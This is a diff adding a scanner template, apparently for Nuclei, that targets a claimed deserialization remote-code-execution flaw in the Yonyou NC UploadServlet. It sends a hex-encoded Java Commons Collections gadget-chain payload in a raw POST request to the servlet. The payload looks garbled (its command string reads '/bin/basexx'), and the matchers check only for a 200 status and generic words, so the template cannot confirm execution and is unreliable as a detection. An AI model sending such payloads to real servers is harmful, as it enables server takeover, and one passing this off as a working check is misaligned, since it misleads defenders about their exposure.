@@ -1,0 +1,31 @@
+id: yonyou-nc-uploadservlet-rce
+info:
+  name: Yonyou NC UploadServlet Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yonyou NC Cloud UploadServlet suffers from a deserialization vulnerability that allows attackers to execute arbitrary commands on the server, upload backdoors, and gain full control over the server.
+  tags: rce, deserialization
+  reference:
+    - http://www.yonyougz.com/yonyou/yonyou-nc/
+variables:
+  payload: |
+    \xac\xed\x00\x05sr\x00\x11java.util.HashSet\xbaD\x85\x95\x96\xb8\xb74\x03\x00\x00xpw\x0c\x00\x00\x00\x01?@\x00\x00\x00\x00\x00\x01sr\x004org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyq\x00~\x00\x01L\x00\x03mapt\x00\x0forg/apache/commons/collections/map/LazyMap;xpt\x00\x03foosr\x003org.apache.commons.collections.map.LazyMap\xee\x94\x82\x9e\x79\x10\x94\x03\x00\x01L\x00\x07factoryt\x00,org/apache/commons/collections/Transformer;xpsr\x002org.apache.commons.collections.functors.ChainedTransformer0\xc7\x97\xec(\x7a\x97\x04\x02\x00\x01[\x00\riTransformerst\x00-\x5borg/apache/commons/collections/Transformer;xpur\x00-\x5borg.apache.commons.collections.Transformer;\xbdV*\xf1\xd83\x18\x99\x02\x00\x00xp\x00\x00\x00\x07sr\x003org.apache.commons.collections.functors.ConstantTransformerXv\x90\x11A\x02\xb1\x94\x02\x00\x01L\x00\x09iConstantq\x00~\x00\x01xpt\x00\x0bnewInstanceur\x00-\x5borg.apache.commons.collections.functors.InvokerTransformer\x87\xe8\xffk{\x7c\xce8\x02\x00\x03[\x00\x05iArgsq\x00~\x00\x01L\x00\x0biMethodNameq\x00~\x00\x01[\x00\x0biParamTypesq\x00~\x00\x01xp\x00\x00\x00\x01t\x00\x07<init>[\x00\x00xpur\x00-\x5borg.apache.commons.collections.functors.InvokerTransformer\x87\xe8\xffk{\x7c\xce8\x02\x00\x03[\x00\x05iArgsq\x00~\x00\x01L\x00\x0biMethodNameq\x00~\x00\x01[\x00\x0biParamTypesq\x00~\x00\x01xp\x00\x00\x00\x01t\x00\x08executesur\x00-\x5borg.apache.commons.collections.functors.ConstantTransformerXv\x90\x11A\x02\xb1\x94\x02\x00\x01L\x00\x09iConstantq\x00~\x00\x01xpt\x00\x07/bin/basexx
+http:
+  - raw:
+      - |
+        POST /servlet/~baseapp/nc.document.pub.fileSystem.servlet.UploadServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+        Content-Length: {{len(payload)}}
+
+        {{payload}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<response>"
+          - "successfully processed"
